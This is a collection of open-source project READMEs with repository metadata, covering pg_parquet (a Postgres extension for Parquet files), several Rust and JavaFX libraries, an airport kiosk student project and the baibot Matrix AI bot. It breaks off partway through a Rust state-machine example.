  - [Copy FROM/TO Parquet files TO/FROM Postgres tables](#copy-tofrom-parquet-files-fromto-postgres-tables)
  - [Inspect Parquet schema](#inspect-parquet-schema)
  - [Inspect Parquet metadata](#inspect-parquet-metadata)
- [Object Store Support](#object-store-support)
- [Copy Options](#copy-options)
- [Configuration](#configuration)
- [Supported Types](#supported-types)
  - [Nested Types](#nested-types)
- [Postgres Support Matrix](#postgres-support-matrix)

## Installation From Source
After installing `Postgres`, you need to set up `rustup`, `cargo-pgrx` to build the extension.

```bash
# install rustup
> curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# install cargo-pgrx
> cargo install cargo-pgrx

# configure pgrx
> cargo pgrx init --pg17 $(which pg_config)

# append the extension to shared_preload_libraries in ~/.pgrx/data-17/postgresql.conf 
> echo ""shared_preload_libraries = 'pg_parquet'"" >> ~/.pgrx/data-17/postgresql.conf

# run cargo-pgrx to build and install the extension
> cargo pgrx run

# create the extension in the database
psql> ""CREATE EXTENSION pg_parquet;""
```

## Usage
There are mainly 3 things that you can do with `pg_parquet`:
1. You can export Postgres tables/queries to Parquet files,
2. You can ingest data from Parquet files to Postgres tables,
3. You can inspect the schema and metadata of Parquet files.

### COPY to/from Parquet files from/to Postgres tables
You can use PostgreSQL's `COPY` command to read and write Parquet files. Below is an example of how to write a PostgreSQL table, with complex types, into a Parquet file and then to read the Parquet file content back into the same table.

```sql
-- create composite types
CREATE TYPE product_item AS (id INT, name TEXT, price float4);
CREATE TYPE product AS (id INT, name TEXT, items product_item[]);

-- create a table with complex types
CREATE TABLE product_example (
    id int,
    product product,
    products product[],
    created_at TIMESTAMP,
    updated_at TIMESTAMPTZ
);

-- insert some rows into the table
insert into product_example values (
    1,
    ROW(1, 'product 1', ARRAY[ROW(1, 'item 1', 1.0), ROW(2, 'item 2', 2.0), NULL]::product_item[])::product,
    ARRAY[ROW(1, NULL, NULL)::product, NULL],
    now(),
    '2022-05-01 12:00:00-04'
);

-- copy the table to a parquet file
COPY product_example TO '/tmp/product_example.parquet' (format 'parquet', compression 'gzip');

-- show table
SELECT * FROM product_example;

-- copy the parquet file to the table
COPY product_example FROM '/tmp/product_example.parquet';

-- show table
SELECT * FROM product_example;
```

### Inspect Parquet schema
You can call `SELECT * FROM parquet.schema(<uri>)` to discover the schema of the Parquet file at given uri.

```sql
SELECT * FROM parquet.schema('/tmp/product_example.parquet') LIMIT 10;
             uri              |     name     | type_name  | type_length | repetition_type | num_children | converted_type | scale | precision | field_id | logical_type 
------------------------------+--------------+------------+-------------+-----------------+--------------+----------------+-------+-----------+----------+--------------
 /tmp/product_example.parquet | arrow_schema |            |             |                 |            5 |                |       |           |          | 
 /tmp/product_example.parquet | id           | INT32      |             | OPTIONAL        |              |                |       |           |        0 | 
 /tmp/product_example.parquet | product      |            |             | OPTIONAL        |            3 |                |       |           |        1 | 
 /tmp/product_example.parquet | id           | INT32      |             | OPTIONAL        |              |                |       |           |        2 | 
 /tmp/product_example.parquet | name         | BYTE_ARRAY |             | OPTIONAL        |              | UTF8           |       |           |        3 | STRING
 /tmp/product_example.parquet | items        |            |             | OPTIONAL        |            1 | LIST           |       |           |        4 | LIST
 /tmp/product_example.parquet | list         |            |             | REPEATED        |            1 |                |       |           |          | 
 /tmp/product_example.parquet | element        |            |             | OPTIONAL        |            3 |                |       |           |        5 | 
 /tmp/product_example.parquet | id           | INT32      |             | OPTIONAL        |              |                |       |           |        6 | 
 /tmp/product_example.parquet | name         | BYTE_ARRAY |             | OPTIONAL        |              | UTF8           |       |           |        7 | STRING
(10 rows)
```

### Inspect Parquet metadata
You can call `SELECT * FROM parquet.metadata(<uri>)` to discover the detailed metadata of the Parquet file, such as column statistics, at given uri.

```sql
SELECT uri, row_group_id, row_group_num_rows, row_group_num_columns, row_group_bytes, column_id, file_offset, num_values, path_in_schema, type_name FROM parquet.metadata('/tmp/product_example.parquet') LIMIT 1;
             uri              | row_group_id | row_group_num_rows | row_group_num_columns | row_group_bytes | column_id | file_offset | num_values | path_in_schema | type_name 
------------------------------+--------------+--------------------+-----------------------+-----------------+-----------+-------------+------------+----------------+-----------
 /tmp/product_example.parquet |            0 |                  1 |                    13 |             842 |         0 |           0 |          1 | id             | INT32
(1 row)
```

```sql
SELECT stats_null_count, stats_distinct_count, stats_min, stats_max, compression, encodings, index_page_offset, dictionary_page_offset, data_page_offset, total_compressed_size, total_uncompressed_size FROM parquet.metadata('/tmp/product_example.parquet') LIMIT 1;
 stats_null_count | stats_distinct_count | stats_min | stats_max |    compression     |        encodings         | index_page_offset | dictionary_page_offset | data_page_offset | total_compressed_size | total_uncompressed_size 
------------------+----------------------+-----------+-----------+--------------------+--------------------------+-------------------+------------------------+------------------+-----------------------+-------------------------
                0 |                      | 1         | 1         | GZIP(GzipLevel(6)) | PLAIN,RLE,RLE_DICTIONARY |                   |                      4 |               42 |                   101 |                      61
(1 row)
```

You can call `SELECT * FROM parquet.file_metadata(<uri>)` to discover file level metadata of the Parquet file, such as format version, at given uri.

```sql
SELECT * FROM parquet.file_metadata('/tmp/product_example.parquet')
             uri              | created_by | num_rows | num_row_groups | format_version 
------------------------------+------------+----------+----------------+----------------
 /tmp/product_example.parquet | pg_parquet |        1 |              1 | 1
(1 row)
```

You can call `SELECT * FROM parquet.kv_metadata(<uri>)` to query custom key-value metadata of the Parquet file at given uri.

```sql
SELECT uri, encode(key, 'escape') as key, encode(value, 'escape') as value FROM parquet.kv_metadata('/tmp/product_example.parquet');
             uri              |     key      |    value
------------------------------+--------------+---------------------
 /tmp/product_example.parquet | ARROW:schema | /////5gIAAAQAAAA ...
(1 row)
```

## Object Store Support
`pg_parquet` supports reading and writing Parquet files from/to `S3` object store. Only the uris with `s3://` scheme is supported. 

The simplest way to configure object storage is by creating the standard `~/.aws/credentials` and `~/.aws/config` files:

```bash
$ cat ~/.aws/credentials
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

$ cat ~/.aws/config 
[default]
region = eu-central-1
```

Alternatively, you can use the following environment variables when starting postgres to configure the S3 client:
- `AWS_ACCESS_KEY_ID`: the access key ID of the AWS account
- `AWS_SECRET_ACCESS_KEY`: the secret access key of the AWS account
- `AWS_REGION`: the default region of the AWS account
- `AWS_SHARED_CREDENTIALS_FILE`: an alternative location for the credentials file
- `AWS_CONFIG_FILE`: an alternative location for the config file
- `AWS_PROFILE`: the name of the profile from the credentials and config file (default profile name is `default`)

> [!NOTE]
> To be able to write into a object store location, you need to grant `parquet_object_store_write` role to your current postgres user.
> Similarly, to read from an object store location, you need to grant `parquet_object_store_read` role to your current postgres user.

## Copy Options
`pg_parquet` supports the following options in the `COPY TO` command:
- `format parquet`: you need to specify this option to read or write Parquet files which does not end with `.parquet[.<compression>]` extension,
- `row_group_size <int>`: the number of rows in each row group while writing Parquet files. The default row group size is `122880`,
- `row_group_size_bytes <int>`: the total byte size of rows in each row group while writing Parquet files. The default row group size bytes is `row_group_size * 1024`,
- `compression <string>`: the compression format to use while writing Parquet files. The supported compression formats are `uncompressed`, `snappy`, `gzip`, `brotli`, `lz4`, `lz4raw` and `zstd`. The default compression format is `snappy`. If not specified, the compression format is determined by the file extension,
- `compression_level <int>`: the compression level to use while writing Parquet files. The supported compression levels are only supported for `gzip`, `zstd` and `brotli` compression formats. The default compression level is `6` for `gzip (0-10)`, `1` for `zstd (1-22)` and `1` for `brotli (0-11)`.

`pg_parquet` supports the following options in the `COPY FROM` command:
- `format parquet`: you need to specify this option to read or write Parquet files which does not end with `.parquet[.<compression>]` extension,

## Configuration
There is currently only one GUC parameter to enable/disable the `pg_parquet`:
- `pg_parquet.enable_copy_hooks`: you can set this parameter to `on` or `off` to enable or disable the `pg_parquet` extension. The default value is `on`.

## Supported Types
`pg_parquet` has rich type support, including PostgreSQL's primitive, array, and composite types. Below is the table of the supported types in PostgreSQL and their corresponding Parquet types.

| PostgreSQL Type   | Parquet Physical Type     | Logical Type     |
|-------------------|---------------------------|------------------|
| `bool`            | BOOLEAN                   |                  |
| `smallint`        | INT16                     |                  |
| `integer`         | INT32                     |                  |
| `bigint`          | INT64                     |                  |
| `real`            | FLOAT                     |                  |
| `oid`             | INT32                     |                  |
| `double`          | DOUBLE                    |                  |
| `numeric`(1)      | FIXED_LEN_BYTE_ARRAY(16)  | DECIMAL(128)     |
| `text`            | BYTE_ARRAY                | STRING           |
| `json`            | BYTE_ARRAY                | STRING           |
| `bytea`           | BYTE_ARRAY                |                  |
| `date` (2)        | INT32                     | DATE             |
| `timestamp`       | INT64                     | TIMESTAMP_MICROS |
| `timestamptz` (3) | INT64                     | TIMESTAMP_MICROS |
| `time`            | INT64                     | TIME_MICROS      |
| `timetz`(3)       | INT64                     | TIME_MICROS      |
| `geometry`(4)     | BYTE_ARRAY                |                  |

### Nested Types
| PostgreSQL Type   | Parquet Physical Type     | Logical Type     |
|-------------------|---------------------------|------------------|
| `composite`       | GROUP                     | STRUCT           |
| `array`           | element's physical type   | LIST             |
| `crunchy_map`(5)  | GROUP                     | MAP              |

> [!WARNING]
> - (1) `numeric` type is written the smallest possible memory width to parquet file as follows:
>    * `numeric(P <= 9, S)` is represented as `INT32` with `DECIMAL` logical type
>    * `numeric(9 < P <= 18, S)` is represented as `INT64` with `DECIMAL` logical type
>    * `numeric(18 < P <= 38, S)` is represented as `FIXED_LEN_BYTE_ARRAY(9-16)` with `DECIMAL` logical type
>    * `numeric(38 < P, S)` is represented as `BYTE_ARRAY` with `STRING` logical type
>    * `numeric` is allowed by Postgres. (precision and scale not specified). These are represented by a default precision (38) and scale (16) instead of writing them as string. You get runtime error if your table tries to read or write a numeric value which is not allowed by the default precision and scale (22 integral digits before decimal point, 16 digits after decimal point).
> - (2) The `date` type is represented according to `Unix epoch` when writing to Parquet files. It is converted back according to `PostgreSQL epoch` when reading from Parquet files.
> - (3) The `timestamptz` and `timetz` types are adjusted to `UTC` when writing to Parquet files. They are converted back with `UTC` timezone when reading from Parquet files.
> - (4) The `geometry` type is represented as `BYTE_ARRAY` encoded as `WKB` when `postgis` extension is created. Otherwise, it is represented as `BYTE_ARRAY` with `STRING` logical type.
> - (5) `crunchy_map` is dependent on functionality provided by [Crunchy Bridge](https://www.crunchydata.com/products/crunchy-bridge). The `crunchy_map` type is represented as `GROUP` with `MAP` logical type when `crunchy_map` extension is created. Otherwise, it is represented as `BYTE_ARRAY` with `STRING` logical type.

> [!WARNING]
> Any type that does not have a corresponding Parquet type will be represented, as a fallback mechanism, as `BYTE_ARRAY` with `STRING` logical type. e.g. `enum`

## Postgres Support Matrix
`pg_parquet` supports the following PostgreSQL versions:
| PostgreSQL Major Version | Supported |
|--------------------------|-----------|
| 14                       |    ‚úÖ     |
| 15                       |    ‚úÖ     |
| 16                       |    ‚úÖ     |
| 17                       |    ‚úÖ     |
",0,12,6,NOASSERTION,ci.yml,40.0
dwpeng/filterx,main,"
## filterx

<p align=""center"">
<img src=""./docs/docs/public/filterx-icon.png"" width=""100"" height=""100"" alt=""filterx logo"">
</p>

<p align=""center"">

[![pypi](https://github.com/dwpeng/filterx/actions/workflows/release-pypi.yml/badge.svg)](https://github.com/dwpeng/filterx/actions/workflows/release-pypi.yml) [![Github Release](https://github.com/dwpeng/filterx/actions/workflows/release.yml/badge.svg)](https://github.com/dwpeng/filterx/actions/workflows/release.yml)  ![PyPI Downloads](https://static.pepy.tech/badge/filterx)

</p>

A fast command-line tool to filter lines by column-based expression.


## Features
- üöÄ Filter lines by column-based expression
- üé® Support multiple input formats e.g. vcf/sam/fasta/fastq/gff/bed/csv/tsv
- üéâ Cross-platform support
- üì¶ Easy to install
- üìö Rich documentations

## Installation

Using pip or cargo to install `filterx`:

```bash
pip install filterx
```

```bash
cargo install filterx
```

Download the latest release from [releases](https://github.com/dwpeng/filterx/releases).


## Documentation

filterx have rich documentations, you can find them in [docs](https://filterx.dwpeng.com).

filterx has a built-in help system, you can use `filterx info --list` to list all available built-in functions, and use `filterx info <command>` to get help for a specific function.


## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=dwpeng/filterx&type=Date)](https://star-history.com/#dwpeng/filterx&Date)
",5,0,1,MIT,"release-pypi.yml,release.yml",0.0
Kiranwaghmare123/PG-DAC-Aug2024,main,"# PG-DAC-Aug2024
Algorithms and Data Structure
",0,0,1,,,0.0
Blueblue1101/SmartFlightCheckInKiosk,main,"# Readme

## 0.Introduction
***We do recommend you to read the README file in markdown [here](README.md).***

The aim of this project is to develop a smart kiosks in front of its check-in desks at the Airport. To develop this system, we first have meetings to brainstorm for specific requirements. Then we use some fact-finding techniques such as interviews, observation, questionnaire and so on to make the requirements clear and accurate enough. Then we write java code through iterative development. At the end, we improve the user interface and produce some documents like user manuals. We hope every user of this software and our customer can be satisfied with this software.

### 0.1 Environment

| OS      | maven | junit | javafx | controlsfx | formsfx-core | validatorfx | ikonli-javafx | bootstrapfx-core | tilesfx | maven-compiler-plugin |  jdk| javafx-maven-plugin |configuration |
| ------- | ----- | ----- | ------ | ---------- | ------------ | ----------- | ------------- | ---------------- | ------- | --------------------- | ------------- | ------------------- |------------------- |
| Win_x64 | 4.0.0 | 5.8.1 | 15.0.1 | 11.1.0     | 11.3.2       | 0.1.13      | 12.2.0        | 0.4.0            | 11.48   | 3.8.1                 | 18.0.1            | 0.0.8               |15 |



## 1. Open

There are three ways to operate the program

#### 1.1 Open with source code

To open the system, open the folder with from your IDE and find the java file 'src/main/java/group16/smartflightcheckinkiosk/APP.java' and run it.

![img.png](ReadmeImg/APPshoot.png)


#### 1.2 Open with executable file 
<span style=""color:red"">You could get the executable file in our [release]() in Github, which will help you enjoy the software without any commanline input. </span>

#### 1.2.1 Open with .exe file

you can doubleclick the ""SmartFlightCheckInKiosk.exe"" to operate it

or use ""cmd"" and enter the directory, then run ""start SmartFlightCheckInKiosk.exe"" .

#### 1.2.2 Open with .jar file

you can doubleclick the ""SmartFlightCheckInKiosk.jar"" to operate it

or use ""cmd"" and enter the directory, then run ""Java -jar SmartFlightCheckInKiosk.jar"". While you have to make sure your jdk version is openjdk18.0.1.

![1653916681802](ReadmeImg/run.png)

## 2. Passenger Log In

![img.png](ReadmeImg/cl.png)

Click passenger and then enter the passenger's login page. On this page, you can choose three ways to check-in

![img.png](ReadmeImg/login.png))


### 2.1 Log in

The first method is to click the first button"" Booking Number"" and you can enter the check-in of different people through the book number in the following table:

![img.png](ReadmeImg/login-1.png)

| 123456 | JACK |
| ------ | ---- |
| 123457 | ROSE |
| 123458 | TOM  |
| 123459 | MIKE |

![img.png](ReadmeImg/login-2.png)

The second method is to click the second button ""Surname&ID number"" and enter the surname and id number. You can enter the check-in of different people through the surname and ID number in the following table:

| ID number | Surname |
| --------- | ------- |
| 01        | JACK    |
| 02        | ROSE    |
| 03        | TOM     |
| 04        | MIKE    |

![img.png](ReadmeImg/idcidc.png)

The third method is to click the third button and scan the id-card. We use the ""login.csv"" in the project as the id-card information entered by the passenger, so you can click ok to directly enter the subsequent interface, and click ""back ""at the bottom You can go back to the previous ChooseLogin interface.



### 2.2 Extra Options 

After logging in,  there is the main menu page, where you can see the booking information. The subsequent operations can be performed in the upper menu bar. 

![img.png](ReadmeImg/mainmenu.png)

First, you can directly return to the ""ChooseLogin"" page from Login-Quit. The second tab is ""Choose"" where passengers can choose meals and seats at Meal and Seat. The selected item button will turn blue.

![img.png](ReadmeImg/xhs1.png)

![img.png](ReadmeImg/zw.png)

The selected meal and seat and the amount to be paid can be seen in the third tab ""Budget"", enter the credit card number, click ""ok"" to pay, if the number is wrong, it will display ""sorry, your car number is not correct"" , if the balance is insufficient, it will display ""sorry, your balance is not enough"", if the payment is successful, it will display ""successfully paid!O(‚à©_‚à©)O"", and the text on the ""ok"" button will be grayed out and cannot be clicked.

![img.png](ReadmeImg/bgbgbg.png)

 The table below shows passengers and their account numbers and balances

| Surname | Credit number | balance |
| ------- | ------------- | ------- |
| JACK    | 666           | 100.0   |
| ROSE    | 777           | 225.0   |
| TOM     | 888           | 200.0   |
| MIKE    | 999           | 100.0   |

_(If you want to test this function, you can enter the wrong number by entering the wrong number, or enter the correct number but select meals and seats that are out of balance)_

### 2.3 Boarding pass

The fourth tab is the last step of the passenger check-in boarding pass. First enter the interface called boardingpass-check, which will display the boarding information including the passenger's selected seat and meal information.

![img.png](ReadmeImg/bcbcbc.png)

Note that you can click Next and print out the ticket and other information normally only after you have successfully paid the extra cost and selected your seat successfully.

 *If you want to test this error checking function:*

* *The situations where you cannot proceed to the next step includes: 1. Entering this interface without selecting a seat 2. When there are additional expenses that have not been paid*
* T*he situations where you can proceed to the next step includes: 1. When choosing a free seat such as A4 without ordering or paying for food 2. After successful payment of all additional expenses*

The second page is a notification page, notificating passengers that three items would be printed out:the boarding pass, the ticket corresponding to each check-in baggage, and the tag corresponding to each carry-on baggage

![img.png](ReadmeImg/boardingpass-final.png)

Click ""ok"" to print out the above items. There is a boardingpass window, each carry-on baggage corresponds to a boardingpass-tag window (with the tag name starting with CO), and each check baggage corresponds to a boarding-ticket window (with counter and tag name starting with CI) 

The following table shows the "" owner, tag name, counter number, category"" of each luggage

| owner | tag  | counter | type(1.check-in 2.carry-on) |
| ----- | ---- | ------- | --------------------------- |
| JACK  | CI1  | 01      | 1                           |
| JACK  | CI2  | 01      | 1                           |
| JACK  | CI3  | 02      | 1                           |
| JACK  | CO1  |         | 2                           |
| JACK  | CO2  |         | 2                           |
| JACK  | CO3  |         | 2                           |
| JACK  | CO4  |         | 2                           |
| ROSE  | CI4  | 01      | 1                           |
| ROSE  | CI5  | 01      | 1                           |
| TOM   | CI6  | 01      | 1                           |
| TOM   | CO5  |         | 2                           |



## 3. Staff

Click ""Back"" buttons until go back to the ChooseLogin page. Then click on ""Staff"" button to enter the first window of the staff system (Staff Login window).

The Staff system including StaffLogin, EnterFlight, CheckFlight and FlightList window.

This module allows staff to enter back-end system and inquire the information and check-in status of all passengers who have booked this flight. 

### 3.1 Staff login

After entering the staff login window, you can put in your staff ID and password to access the Back-end system.

<img src=""ReadmeImg/stafflogin.png"" alt=""tag"" style=""zoom:50%;"" />

You can use the following account to log in:

| Staff ID | Password |
| -------- | -------- |
| 123      | 456      |



### 3.2 Check flight information

After entering the back-end system, enter the flight number you want to query.

<img src=""ReadmeImg/enterflight.png"" alt=""tag"" style=""zoom:50%;"" />

You can check the following flights:

| Flight number |
| ------------- |
| CA1343        |
| EC3434        |



### 3.3 Confirm your inquiry

To prevent similar flights from being queried due to incorrect input, please confirm the flight you want to query through the flight details.

<img src=""ReadmeImg/checkflight.png"" alt=""tag"" style=""zoom:50%;"" />

### 3.4 Passenger list

After confirming the flight, check the passenger information and check-in status in the back-end  system. In order to check the overall check-in status, the kiosk will put the number of unchecked passengers in this flight at the bottom.

<img src=""ReadmeImg/flightlist.png"" alt=""tag"" style=""zoom:50%;"" />
",0,0,1,,,3.0
mkpaz/devtoolsfx,master,"# devtoolsfx

DevToolsFX is a tool for navigating your application's scene graph and exploring node properties. It aims to be similar
to Chrome DevTools, but for JavaFX.

It's lightweight, around 250 KB, with no dependencies, allowing you to easily embed it into your app. The only JavaFX
dependency is `javafx.controls`, which your app will need regardless.

<p align=""center"">
<img src=""https://raw.githubusercontent.com/mkpaz/devtoolsfx/master/.screenshots/inspector.png"" alt=""inspector""/>
</p>

Find more screenshots [here](https://github.com/mkpaz/devtoolsfx/tree/master/.screenshots).

## Getting started

Maven:

```xml

<dependency>
    <groupId>io.github.mkpaz</groupId>
    <artifactId>devtoolsfx-gui</artifactId>
    <version>TBD</version>
</dependency>
```

Gradle:

```groovy
dependencies {
    implementation 'io.github.mkpaz:devtoolsfx-gui:TBD'
}
```

After the primary stage is shown, you can launch the dev tools GUI at any time with:

```java
primaryStage.setOnShown(
    e -> GUI.openToolStage(primaryStage, getHostServices())
);
```

Check the `devtoolsfx.gui.GUI` class for additional ways to launch the dev tools, such as embedding it at the top or
bottom. Also, refer to the demo for a more detailed example.
",0,1,1,MIT,,0.0
flashbots/rbuilder-operator,main,"# rbuilder-operator
Specific implementation (based on the public rbuilder) of a block builder to be used on a TDX context.
",0,0,14,Apache-2.0,"checks.yaml,release.yaml",11.0
dmpierre/ark-superspartan,main,"#### Description 

[Superspartan](https://eprint.iacr.org/2023/552.pdf) is a PIOP for customizable constraint systems ([CCS](https://eprint.iacr.org/2023/552.pdf)), generalizing spartan.

> :warning: This is an example implementation, intended neither as a reference nor for production use. This code has not been audited.

We use the `CCS` implementation available in [sonobe](https://github.com/privacy-scaling-explorations/sonobe/tree/main) and the [hyperplonk](https://github.com/EspressoSystems/hyperplonk/tree/main) sumcheck implementation - but wrapped in sonobe as well. 
",0,0,1,,,0.0
tisonkun/mea,main,"# Make Easy Async (Mea)

[![Crates.io][crates-badge]][crates-url]
[![Documentation][docs-badge]][docs-url]
[![MSRV 1.80][msrv-badge]](https://www.whatrustisit.com)
[![Apache 2.0 licensed][license-badge]][license-url]
[![Build Status][actions-badge]][actions-url]

[crates-badge]: https://img.shields.io/crates/v/mea.svg
[crates-url]: https://crates.io/crates/mea
[docs-badge]: https://docs.rs/mea/badge.svg
[docs-url]: https://docs.rs/mea
[msrv-badge]: https://img.shields.io/badge/MSRV-1.80-green?logo=rust
[license-badge]: https://img.shields.io/crates/l/mea
[license-url]: LICENSE
[actions-badge]: https://github.com/tisonkun/mea/actions/workflows/ci.yml/badge.svg
[actions-url]: https://github.com/tisonkun/mea/actions/workflows/ci.yml

## Overview

Mea (Make Easy Async) is a runtime-agnostic library providing essential synchronization primitives for asynchronous Rust programming. The library offers a collection of well-tested, efficient synchronization tools that work with any async runtime.

## Features

* [**Barrier**](https://docs.rs/mea/*/mea/barrier/struct.Barrier.html): A synchronization primitive that enables tasks to wait until all participants arrive.
* [**Latch**](https://docs.rs/mea/*/mea/latch/struct.Latch.html): A synchronization primitive that allows one or more tasks to wait until a set of operations completes.
* [**Mutex**](https://docs.rs/mea/*/mea/mutex/struct.Mutex.html): A mutual exclusion primitive for protecting shared data.
* [**Semaphore**](https://docs.rs/mea/*/mea/semaphore/struct.Semaphore.html): A synchronization primitive that controls access to a shared resource.
* [**WaitGroup**](https://docs.rs/mea/*/mea/waitgroup/struct.WaitGroup.html): A synchronization primitive that allows waiting for multiple tasks to complete.

## Installation

Add the dependency to your `Cargo.toml` via:

```shell
cargo add mea
```

## Runtime Agnostic

All synchronization primitives in this library are runtime-agnostic, meaning they can be used with any async runtime like Tokio, async-std, or others. This makes the library highly versatile and portable.

## Thread Safety

All types in this library implement `Send` and `Sync`, making them safe to share across thread boundaries. This is essential for concurrent programming where data needs to be accessed from multiple threads.

## Minimum Supported Rust Version (MSRV)

This crate is built against the latest stable release, and its minimum supported rustc version is 1.80.0.

The policy is that the minimum Rust version required to use this crate can be increased in minor version updates. For example, if Mea 1.0 requires Rust 1.20.0, then Mea 1.0.z for all values of z will also require Rust 1.20.0 or newer. However, Mea 1.y for y > 0 may require a newer minimum version of Rust.

## License

This project is licensed under [Apache License, Version 2.0](LICENSE).
",0,1,1,Apache-2.0,ci.yml,15.0
mekaem/graphmemes,main,"# graphmemes

A `#![no_std]` compatible, zero-allocation Unicode grapheme cluster iterator.

## Key Features

- **Zero-Allocation Design**: Fixed-size buffer implementation with no heap allocations
- **Unicode Processing**:
  - Complete UAX #29 grapheme cluster boundary detection
  - Efficient bit pattern-based boundary rules
  - Support for combining marks, emoji, and ZWJ sequences
  - Regional indicator (flag) handling
  - RTL text with combining marks
- **ANSI Support**:
  - Optional ANSI escape sequence counting
  - Safe sequence validation and processing

## #![no_std] Support

This crate is `#![no_std]` compatible and makes zero heap allocations. All operations use fixed-size buffers and stack-only data structures.

## Dependencies

```toml
[dependencies]
owo-colors = ""4.1.0""
```

## License

This project is licensed under [![License: MPL 2.0](https://img.shields.io/badge/License-MPL%202.0-brightgreen.svg)](LICENSE)

",0,0,1,MPL-2.0,rust.yml,0.0
etkecc/baibot,main,"<p align=""center"">
	<img src=""./etc/assets/baibot.svg"" alt=""baibot logo"" width=""150"" />
	<h1 align=""center"">baibot</h1>
</p>

ü§ñ baibot is an [AI](https://en.wikipedia.org/wiki/Artificial_intelligence) ([Large Language Model](https://en.wikipedia.org/wiki/Large_language_model)) bot for [Matrix](https://matrix.org/) built by [etke.cc](https://etke.cc/) (managed Matrix servers).

The name is pronounced 'bye'-bot and is a play on [AI](https://en.wikipedia.org/wiki/Artificial_intelligence), referencing the fictional character [üáßüá¨ Bai Ganyo](https://en.wikipedia.org/wiki/Bay_Ganyo).

It's designed as a more private and [featureful](#-features) alternative to [matrix-chatgpt-bot](https://github.com/matrixgpt/matrix-chatgpt-bot).
It's influenced by [chaz](https://github.com/arcuru/chaz), but does **not** use the [AIChat](https://github.com/sigoden/aichat) CLI tool and instead does everything in-process, without forking.


## üåü Features

- üé® Encourages **[provider](./docs/providers.md) choice** ([Anthropic](./docs/providers.md#anthropic), [Groq](./docs/providers.md#groq), [LocalAI](./docs/providers.md#localai), [OpenAI](./docs/providers.md#openai) and [‚òÅÔ∏è many more](./docs/providers.md#Ô∏è-providers)) as well as **[mixing & matching models](./docs/features.md#-mixing--matching-models)**:

- Supports **different use purposes** (depending on the [‚òÅÔ∏è provider](./docs/providers.md) & model):

  - [üí¨ text-generation](./docs/features.md#-text-generation): communicating with you via text
  - [ü¶ª speech-to-text](./docs/features.md#-speech-to-text): turning your voice messages into text
  - [üó£Ô∏è text-to-speech](./docs/features.md#%EF%B8%8F-text-to-speech): turning bot or users text messages into voice messages
  - [üñåÔ∏è image-generation](./docs/features.md#%EF%B8%8F-image-generation): generating images based on instructions

- ü™Ñ Supports [seamless voice interaction](./docs/features.md#seamless-voice-interaction) (turning user voice messages into text, answering in text, then turning that text back into voice)

- ü¶ª Supports [transcribe-only mode](./docs/features.md#transcribe-only-mode) (turning user voice messages into text, without doing text-generation)

- üó£Ô∏è Supports [text-to-speech-only mode](./docs/features.md#text-to-speech-only-mode) (turning user text messages into voice, without doing text-generation)

- üîí Supports [encryption](./docs/features.md#-encryption) for Matrix communication and Account-Data-stored configuration

- ‚ôªÔ∏è Supports [context-management](./docs/configuration/text-generation.md#Ô∏è-context-management) handling on some models (automatically adjusting the message history length, etc.)

- üõ†Ô∏è Allows **customizing much of the bot's [configuration](./docs/configuration/README.md)** at runtime (using commands sent via chat)

- üë• **Actively maintained** by the team at [etke.cc](https://etke.cc/)


## üñºÔ∏è Screenshots

![Introduction and general usage](./docs/screenshots/introduction-and-general-usage.webp)

You can find more screenshots on the [üåü Features](./docs/features.md) and other [üìö Documentation](./docs/README.md) pages, as well as in the [docs/screenshots](./docs/screenshots) directory.


## üöÄ Getting Started

üó≤ For a quick experiment, you can refer to the [üßë‚Äçüíª development documentation](./docs/development.md) which contains information on how to build and run the bot (and its various dependency services) locally.

For a real installation, see the [üöÄ Installation](./docs/installation.md) documentation which contains information on [üêã Running in a container](./docs/installation.md#-running-in-a-container) and [üñ•Ô∏èÔ∏èÔ∏èÔ∏èÔ∏è Running a binary](./docs/installation.md#-running-a-binary).


## üìö Documentation

See the bot's [üìö documentation](./docs/README.md) for more information on how to use and configure the bot.


## üíª Development

See the bot's [üßë‚Äçüíª development documentation](./docs/development.md) for more information on how to develop on the bot.


## üìú Changes

This bot evolves over time, sometimes with backward-incompatible changes.

When updating the bot, refer to [the changelog](CHANGELOG.md) to catch up with what's new.


## üÜò Support

- Matrix room: [#baibot:etke.cc](https://matrix.to/#/#baibot:etke.cc)

- GitHub issues: [etkecc/baibot/issues](https://github.com/etkecc/baibot/issues)

- (for [etke.cc](https://etke.cc/) customers): etke.cc [support](https://etke.cc/contacts/)
",0,11,1,AGPL-3.0,workflow.yml,0.0
ChrisShain/statement,master,"# Statement - An Event-Driven State Machine
Statement is an event-driven state machine implementation library.
Statement is easy to use, and provides a great deal of flexibility
around how state machines are defined.

# How do I use it?
Statement is organized around the idea that you typically want a 
state machine per instance for a potentially large number of business
entities of the same type. These might be TCP connections, web sessions,
hotel reservations, orders, or anything else that goes through a 
predictable set of states when events happen.

Much more information is available in the docs: https://docs.rs/statement/latest/statement/

# Example
````rust
use anyhow::{anyhow};
use statement::{StateMachineFactory, StateMachineError};

fn test_double_transition<'a>() -> anyhow::Result<()> {
    #[derive(Eq, PartialEq)]
    enum StateMachineMessage {
        GoToTwo
    }

    // State here is just an integer
    let factory = StateMachineFactory::new()
        // Evaluate all transitions in a loop
        // until no transition occurs
        .cycle(true)
        // When we receive a GoToTwo event
        // while in state 1, go to state 2
        .with_event_transition(
            &StateMachineMessage::GoToTwo,
            1,
            2
        )
        // When we transition to state 2,
        // immediately transition to state 3
        .with_auto_transition(
            2,
            3
        )
        // Lock the factory object so that
        // we can build a state machine
        .lock();

    // Build the state machine, with an empty () as data
    // (we don't care about data for this example)
    let mut sm = factory.build(1, ());

    // The StateMachine starts in state 1
    assert_eq!(1, sm.state);

    // Handling an event tells us what state we end up in
    match sm.handle_event(StateMachineMessage::GoToTwo) {
        Ok(state) => {
            assert_eq!(3, *state);
        }
        Err(StateMachineError::EffectError(from, to, e)) => {
            return Err(anyhow!(""error changing state from {} to {}: {}"", from, to, e));
        }
    };

    // Because of the two transitions that we defined,
    // we end up in state 3
    assert_eq!(3, sm.state);
    Ok(())
}
````

This is a longer example, showing use of state machine data 
and more complex transitions:

````rust
use std::sync::atomic::Ordering::SeqCst;
use anyhow::anyhow;
use atomic_float::AtomicF64;
use statement::FromState::{Any, AnyOf};
use statement::{StateMachineFactory, StateTransitionEffectData};
use statement::ToState::Same;

struct CalcData {
    pub input_value: AtomicF64,
    pub stored_value: AtomicF64,
}

#[test]
fn calculator_test() -> anyhow::Result<()> {
